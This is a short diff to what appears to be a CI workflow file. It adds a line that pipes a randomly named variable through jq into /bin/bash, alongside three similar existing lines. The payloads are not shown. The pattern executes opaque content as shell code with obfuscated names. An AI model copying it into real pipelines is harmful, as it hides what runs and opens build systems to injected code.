@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$tuf00603" | jq -r .xv57955 | /bin/bash
           printf '%s' "$b63660" | jq -r .sbqll16 | /bin/bash
           printf '%s' "$sm82" | jq -r .t76283 | /bin/bash
+          echo $mzvp3 | jq -r .kazy44 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
